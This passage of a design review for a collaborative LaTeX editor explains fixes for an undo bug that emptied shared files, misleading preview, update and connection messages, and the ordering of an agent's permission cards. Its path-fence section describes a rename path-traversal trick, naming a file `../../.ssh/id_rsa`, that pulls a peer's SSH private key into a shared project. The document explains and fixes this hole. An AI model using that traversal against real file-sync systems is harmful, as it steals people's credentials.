several records are one idea in different clothes.

### Undo belongs to the writer's own keyboard, and to nothing else

Six presses of Ctrl+Z emptied a file, on disk, for everyone in the share, on a
file nobody had typed in. It is the worst thing the review found and the
mechanism is worth stating plainly, because it is one of two undo stacks
quietly taking work that was not offered to it.

A buffer is built from `opened.text.toString()` before that file's socket has
synced. For a file nobody else has open, the document at that moment is empty,
and the whole chapter arrives afterwards in one transaction from the socket. A
transaction is undoable unless it says otherwise, so that chapter sat on
CodeMirror's undo stack as though the writer had typed it, and undo wrote the
emptied buffer straight back into the shared document, which is to say to disk
and to every other browser.

`collab.ts` had built the right thing and never reached it. `yCollab` is given
a scoped `Y.UndoManager` that tracks only the local sync origin, and it
installs the manager and a `beforeinput` handler for it, and binds no keys.
`yUndoManagerKeymap` is exported by the same package and was imported nowhere.
So Ctrl+Z was taken by `historyKeymap` before the browser ever raised a
`historyUndo` input event, and the scoped manager was inert.

Both halves had to move. The keymap is now bound beside `yCollab`, and
`history()` and `historyKeymap` have come out of `base()` in
`editor-setup.ts`, which the live editor and the read-only panes share. They
live in `withHistory()` now, which only `viewExtensions()` takes: a version
being read and the fallback pane a file gets when it could not be connected
have no shared document behind them, cannot be edited, and should still answer
the key rather than hand it to the browser.

The rule this leaves is one sentence. **A pane with a shared document behind
it has exactly one undo stack, the scoped one, and a pane without one has
CodeMirror's.** Adding an extension to `base()` that touches history puts them
both in the same editor again.

Two tests hold it. `frontend/src/panes/editor-undo.test.ts` builds a live
editor over a real `Y.Doc`, lets the document arrive with a socket-shaped
origin, and presses the key through `runScopeHandlers`, so it is the binding
being tested and not the command. `e2e/specs/undo.spec.ts` does it in a
browser and reads the disk afterwards, which is what was actually being lost.

### A path from somebody else is fenced everywhere it is used, not everywhere it is written

The second blocker. `resolve_for_write` refuses a path that leaves the project
and a path inside `.git`, `.nexttex` or `.claude`, and every write of a shared
file went through it. A rename did not, because a rename has two paths and
only one of them is a write.

`settle_paths` records what a record says its path is the first time it sees
that file, as the baseline the next change is measured against. That went in
unfenced. `_rename_locally` then built its source as `root / was` and its
target through the fence. So the escape ran inwards: name a file
`../../.ssh/id_rsa`, wait, rename it to `notes.tex`, and the file is carried
off the machine's own disk into the project, where the manifest offers it to
everybody in the share. The target being fenced was what made it useful.

The rule is the one the projection already followed and the rename had drifted
from: **a path proposed by the other end is put through the fence at the point
it is used, not at the point it is written down.** A baseline is a source path
later on, so it is fenced when it is recorded; a source is fenced when it is
used; the target keeps the fence it already had.

Two things beside it, both in the same function and the same family.

A local file that a peer's rename displaces used to be moved to
`chapter (was here).tex` inside a suppressed `OSError`. The manifest is the
authority on what a file is called and the local file does have to step aside,
but the writer's work went sideways in silence, under a name they did not
choose, with nothing on any screen saying it had happened. It goes to the
trash now. The trash is restorable, it is a panel somebody can look at, and
removing the file is a change the watcher announces like any other, so all
three of the things that were missing come with it.

And the refusal a write gets was latched on the file id rather than on the
path. Not retrying the same path is right: a record naming
`.git/hooks/pre-commit` will name it just as much next time. But the path is a
field the other end can change, and once an id was in that set nothing took it
out, so a file pointed somewhere ordinary afterwards stayed unwritable for the
rest of the session. It is a map from id to the path that was refused.

### Absence and failure are not the same thing, and neither is "not yet"

The largest family the review found, and the one a writer actually meets,
because every instance of it puts a false sentence on the screen. One signal
is being read as one meaning when it carries several.

**The preview told writers their document was empty.** The PDF route raises
404 whenever `build/main.pdf` is not on disk, and pdflatex writes no PDF for a
document with nothing in it, so three different pieces of news arrive as one
status code: no build has ever finished, one is running right now, and one
finished and produced no pages. Only the third is an empty document. For the
whole of a project's first build, which is several seconds and is the first
thing anybody sees, the pane said "Nothing has been typeset yet. An empty
document produces no pages." That is a statement about the writer's own work,
it is false, and it sends them looking for a fault in a document that is fine.
The Windows laptop met it as the first thing a joining writer sees, with the
build log already on disk beside it.

The store had the answer all along. `builds[document]` carries `compiling`,
and a `result` that stays null until a `compile_done` has landed for that
document. `absenceFrom` takes both now and answers four states rather than
two: **Typesetting** while a build is running, **Not built yet** when none
has finished, **Nothing has been typeset yet** only for a build that finished
and made no pages, and the unreachable screen for everything else.

**The strip said Ready through that same build**, which is the other half and
has a different cause. `compile_start` is news, and the broadcaster keeps no
backlog, so a browser hears it only if it was subscribed at that instant.
Opening a project builds it: `connect()` constructs an `EventSource`, which
returns before the connection exists, and the compile request goes out a few
lines later. The tab regularly missed its own build starting.

The same absence is why a lost `compile_done` latched the strip on Compiling
for ever. **A flag raised by one event and lowered only by another needs a way
to be read, not only listened for.** That is the general rule and this is the
particular one: the event stream's first frame, on every connection and every
automatic reconnection, is now `compile_state`, the state of every document's
build. It is authoritative about what is running and says nothing about what a
build produced, so a browser that already has a result keeps it.

Two smaller ones in the same pane. The cancellation check on the PDF fetch was
on the success path and on neither failure path, so a superseded 404 could
draw the "no preview" screen over a page that had already loaded.

### A stopped server is not a moved deployment, and the promise beside it has to be true

Two records that are one story. A pane is a dynamic import, so when a deploy
replaces the built assets under an open tab, the next pane it opens asks for a
chunk that is no longer there. Reloading onto the new build is the only cure
and the boundary does it, once. What decided when was a pattern over the error
message, and the pattern included a bare `Failed to fetch`, which is what a
browser says for **any** request it could not make.

So a NextTex that had simply stopped was read as a deployment that had moved.
The tab reloaded itself onto the browser's own error page, `ERR_CONNECTION_REFUSED`,
and the editor and everything in it that had not reached the server went with
it. The Windows laptop watched that happen four minutes after the app had told
it, in a `title` attribute, that what you type is kept here until it
reconnects.

The two are separable and were always distinguishable. A browser that could
not import a module says which module; a dead server does not. And the
document socket already knows: `connection` is `offline` before any of this.
`worthReloading` asks both questions, and the boundary asks it.

Once the tab stays, what it says has to be true as well. The failure screen
explained every failure as an update that had happened while the tab was open,
which is a confident and false account of a server somebody stopped, pointing
at a Reload that cannot work. It says which of the two it is now.

And the promise moves out of the tooltip. "What you type is kept here until it
reconnects" was a `title`: the one place the app said what happens to a
writer's work was a place you had to already suspect something to find, and no
place at all on a tablet or to a screen reader reading the strip. It is beside
the word `offline` now. A promise that is on the screen is one the rest of the
app has to keep, which is the reason to move it and not only the effect.

### A check that never reached the network is not an answer about the code

The largest instance of one number carrying two meanings, and the one with the
worst consequence, because the thing it got wrong is whether the writer is
running the version they think they are.

`check()` returns early when the fetch fails, before `behind` is ever
assigned, so it keeps its dataclass default of zero. The footer reads
`report.behind === 0` and draws **Up to date.** Nothing between that line and
the checkout test looks at `error` or `reason`. There is a card that says the
repository could not be reached, and it belongs to `phase.kind === "error"`,
which is the request itself failing; a report that arrives successfully
carrying an error is not that phase and reached nothing that would draw it.

The Windows laptop found it because its server cannot resolve `github.com`
while a shell on the same machine can. It sat five commits behind, was told it
was current, and could not start an update from the page either, because
`can_update` was false and the route refuses. The documented recovery was the
one path closed.

A count cannot say "I could not ask", so the report says it: `checked` is
false until the fetch has actually happened, and the footer asks that before
it reads any number. The rule is the general one this section keeps arriving
at. **A field that means "how many" must never be the field that also means
"I do not know".**

The refusal from the update route carries git's own words after the reason
now, for the same reason: "there is nothing to update" is a statement about
the code, and a fetch that failed has not earned the right to make one.

### The transcript may say a thing is being asked about, never that it happened

A permission card and the tool call it is about are one event, and the panel
drew them as two rows saying the same command, one above the other. That is
the small half. The large half is that every verb in the table is past tense
and the tool row is written when the call arrives rather than when it is
permitted, so `Ran echo hello` sat above a card headed **Run a shell command**,
and if the writer said no the transcript kept both: `Ran`, then `Denied`, the
same command twice, nothing having run.

`docs/design.md` section 28 gave its worst-finding subsection to the record
inverting fact. This is that, in the place a writer looks first.

The two rows had nothing tying them together, and the tie was in scope the
whole way: the SDK hands `_pre_tool` the tool call's id and `_decide`,
`_by_mode`, `_ask_user` and `_settled` all dropped it. The card carries it now,
as `toolId`, on the wire and in the record, so the pairing survives a reload
rebuilding the panel from the transcript.

With the pairing, two things follow. `tidy` folds an **answered** card into its
call, so the command reads once. An **open** card keeps its own row, because it
is a question with four buttons on it and a question the writer cannot answer
is worse than a repeated line. And the row above knows which of the three
states it is in, so it says **Running** while the card is open, **Ran** once
the call was allowed, and **Did not run** when it was refused.

`verbFor` holds both tenses and a test asserts that every tool whose past
tense is a claim has a present tense, so adding a verb to one table and not
the other cannot quietly reintroduce this for that tool.

### One connection was modelled and the other was not

Three records and one absence. The interface has no representation of the peer
link anywhere in its lifetime: it cannot draw a collaborator arriving, cannot
draw one present, and cannot draw one leaving. All three were the same empty
space in the tab strip, and the one badge that does exist watches a different
connection entirely.

`connection` in `collab.ts` is the state of **this browser's WebSocket to its
own server**, built against `location.host`. The peer link, the iroh leg that
carries a collaborator's edits, is not in it. So a laptop that loses its
internet while its browser still reaches localhost shows nothing at all: no
badge, a live-looking interface, and the other person's edits silently stop
arriving while both of them keep typing. That is the honest answer to what
"not connected" looks like on a real network, and it is why the experiment
that would have produced it was not worth running.

The server had modelled it the whole time. `PeerNetwork.state()` answers
`connected` per member, `GET /projects/{id}/collab` serves it, the share sheet
polls it every four seconds, and `Editor.tsx` made the same call and kept only
`me`. The array went in the bin everywhere else.

Three changes. The store keeps the share, from the call the editor was already
making. A link being adopted or dropped publishes `collab_peers`, so arrival
and departure are transitions rather than whatever the next four-second sample
happens to catch: the writer's typing stops reaching anybody at the instant the
link goes, and a sample is not news. And `Collaborators` gains its third
branch: shared, somebody has joined, none of them connected, drawn as
"Sharing with Bob, not connected".

**Two badges, not one badge with two meanings.** The browser's own socket being
down and the peer link being down are different facts, both can be true at
once, and they are drawn separately. Folding them into one word is how a writer
comes to believe the wrong one, which is the mechanism this whole section is
about.

The laptop's last report is what made this three records rather than two. It
sampled its own screen once a second across the window in which the share it
had joined was shut down from this end, and every sample was identical:
`{offline: null, collaborators: null, caretLabels: [], editor: true}`. A writer
whose only collaborator has permanently gone, whose copy is now an ordinary
folder of files, saw exactly what they saw while the collaboration was live.

### `??` on the page, and the only cure written in a tooltip

A fast build is one pdflatex pass. That is what makes typing feel immediate,
and it is also what cannot resolve a reference or a citation, so the preview
shows `??` where a number should be. Everything about why was somewhere else:
a warning count in the status strip, a pane away from the page showing the
`??`, with `mark_warnings` off by default and the diagnostics drawer never
opening itself. A writer sees `??` and has no way to know it is the build
rather than their document.

The strip says it now, beside the scope it already prints: **Whole document ·
references pending**. `referencesPending` asks both halves of the question,
because a *full* pass that still has an undefined reference means a label
really is missing, which is the writer's problem and a different sentence.

And the cure gets a control. Rebuilding everything was Shift-click on a button
labelled Rebuild, written down in a `title` attribute: undiscoverable, and no
use at all on a tablet. The modifier stays; a **Rebuild everything** press
appears beside it when there is a reason to press it.

### Identity by position, in a list that is rebuilt underneath it

Four records, and the same mistake twice on the two sides of one screen.

**Which error to start from was chosen alphabetically.** `summarise` took
`min` over `(file, line)`, and the drawer sorted with `localeCompare` on the
filename. Both are the alphabet, and both docstrings, plus the README, say
document order. `chapters/one.tex` sorts before `main.tex`; a broken preamble
makes every chapter complain; so the writer was sent to fix a consequence,
under a note explaining that the list below the first error is usually its
own consequence.

The log's order is the document's order, because it is the order the engine
read it in, and `parse` appends as it reads. So the answer was already the
first element and the sort was undoing it. The drawer keeps errors before
warnings and otherwise leaves the list alone.

Two existing tests encoded the old behaviour, and one of them asserted it
outright: of an error in `chapters/02.tex` and one in `chapters/01.tex`, the
summary was required to name the second. That is only right when the
filenames happen to sort into the order the document includes them in, which
is true of numbered chapters and of nothing else. Both were rewritten with
their reasoning, because a test that passes and is wrong is worse than one
that fails.

**Which row was open was an index into that list.** The drawer kept `expanded`
and `selected` as positions in a `useMemo` recomputed from every build. A
build that reordered the list left the expansion and the selection bar on
whichever diagnostics had landed in those two slots: a row the writer never
opened and never chose. They are keyed by the diagnostic now, on the same
document, file, line and message the server's own `Diagnostic.key()` uses.

**A helper file belonged to whichever chapter came first.** `chapter_for`
matched by containing directory, and with flat chapters every helper matched
every chapter equally, so the loop kept the first one. A fast build was scoped
to a chapter the edited file has nothing to do with, the writer's change was
not in the pages that came back, and nothing said why. A tie is not an answer:
it returns not-scoped, which the caller already builds the whole document for.

**And a printed percent sign hid the rest of its line.** Six copies of
`^[^%\n]*` guarded these scans, and `\%` is a percent that prints. "We
recovered 95\% of it. \input{chapters/one}" made the `\input` invisible to the
dependency graph and to the chapter scoping, so a chapter silently stopped
being rebuilt because its parent line had gained a percentage. One
`LINE_START` now, in `deps.py`, imported by `compile.py`, matching either an
ordinary character or a backslash and whatever it escapes.
